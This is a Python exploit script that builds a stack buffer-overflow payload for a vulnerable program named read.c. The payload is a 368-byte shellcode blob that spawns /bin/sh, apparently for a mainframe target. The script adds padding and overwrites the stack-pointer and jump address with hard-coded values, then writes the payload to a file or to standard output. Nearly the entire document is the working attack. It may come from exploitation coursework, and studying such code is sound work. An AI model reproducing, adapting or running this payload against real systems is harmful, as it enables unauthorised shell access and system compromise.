#!/usr/local/bin/python
import sys

######################################################
#  pgm to generate buffer for read.c vulnerable pgm  #
######################################################

def build(a1,a2):
	##################
	# constants area #
	##################
	sp="\x1e\x92\x52\x48"
	jmpaddr="\x1e\x92\x52\xf0"
	bytes_to_sp = 12
	buffsize = 600
	fname = "buf"
	filler = ''

	##################
	# sc  buf        #
	# 368 byte       #
	# /bin/sh sc     #
	##################
	buf = (
	"\x90\xec\xd0\x0c\xc0\xf0\xff\xff\xff\xfe\x18\x8f\xc0\xb0\x00\x00"
	"\x00\x66\x50\xd0\xb0\x00\x18\xdb\xa7\x05\x00\x07\xc2\xd7\xe7\xf1"
	"\xc5\xe7\xc3\x40\x00\x00\xc0\x00\xff\xff\xff\xfb\x17\x11\x0a\x08"
	"\x50\x00\x80\xd4\x58\xf0\x80\xd4\x41\x60\x81\x10\x18\x16\x41\x70"
	"\x80\xdc\x50\x70\x60\x00\x41\x70\x80\xe0\x50\x70\x60\x04\x41\x70"
	"\x80\xe8\x50\x70\x60\x08\x41\x70\x81\x48\x50\x70\x60\x0c\x41\x90"
	"\x81\x00\x50\x90\x70\x00\x41\x90\x81\x04\x50\x90\x70\x04\x41\x90"
	"\x81\x08\x50\x90\x70\x08\x41\x70\x81\x58\x50\x70\x60\x10\x41\x90"
	"\x80\xec\x50\x90\x70\x00\x41\x90\x80\xed\x50\x90\x70\x04\x41\x90"
	"\x80\xef\x50\x90\x70\x08\x41\x70\x81\x0c\x50\x70\x60\x14\x50\x70"
	"\x60\x18\x50\x70\x60\x1c\x50\x70\x60\x20\x50\x70\x60\x24\x50\x70"
	"\x60\x28\x50\x70\x60\x2c\xc0\x77\x80\x00\x00\x00\x50\x70\x60\x30"
	"\xa7\x6a\x00\x04\x05\xef\x58\xd0\xb0\x00\x98\xec\xd0\x0c\x17\xff"
	"\x07\xfe\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x07"
	"\x61\x82\x89\x95\x61\xa2\x88\x00\x00\x00\x00\x03\x00\x60\x83\x61"
	"\x82\x89\x95\x61\xa2\x88\x4c\x61\x84\x85\xa5\x61\xa3\xa3\xa8\x00"
	"\x00\x00\x00\x01\x00\x00\x00\x02\x00\x00\x00\x10\x00\x00\x00\x00"
	"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
	"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
	"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
	"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
	"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
	"\x00\x00\x00\x00\x00\x00\x00\x00\xde\xad\xbe\xef\xf0\xf0\xf0\xf0")

	##################
	# jmp back to mn # 
	# 14 bytes       #
	##################
	#getsret = "\x58\xd0\xd0\x04\x58\xe0\xd0\x0c\x98\x26\xd0\x1c\x05\x1e"
	#getsret = "AAAA"
	getsret = ""

	##################
	# build up our   #
	# payload        #
	##################
	payload0 = getsret + buf
	payload1 = payload0 + (buffsize - len(payload0))*"B"
	payload2 = payload1 + "C" * bytes_to_sp	
	payload3 = payload2 + sp + "DDDD" + jmpaddr
	payload4 = payload3 + filler

	
	if a1=="f":
		ofile=open(fname,'w+b')
		ofile.write(payload4)
		ofile.flush()
		ofile.close()
	else:
		# send to std out
		print(payload4)

##################
# main function  #
##################
if __name__ == "__main__":
	if len(sys.argv) > 1:
		if sys.argv[1] == "f":
			build("f","")
	else:
		build("","")
